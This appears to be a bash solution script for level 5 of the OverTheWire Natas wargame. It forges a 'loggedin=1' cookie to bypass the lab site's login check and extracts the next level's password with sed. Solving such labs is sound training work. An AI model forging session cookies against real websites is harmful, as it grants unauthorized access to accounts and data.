#!/bin/bash

curl --user $(./natas4.sh) -H"Cookie:loggedin=1" http://natas5.natas.labs.overthewire.org 2>/dev/null | sed -n "s/^.*\(natas[0-9]\+\)\ is\ \(\w\+\).*$/\1:\2/p"
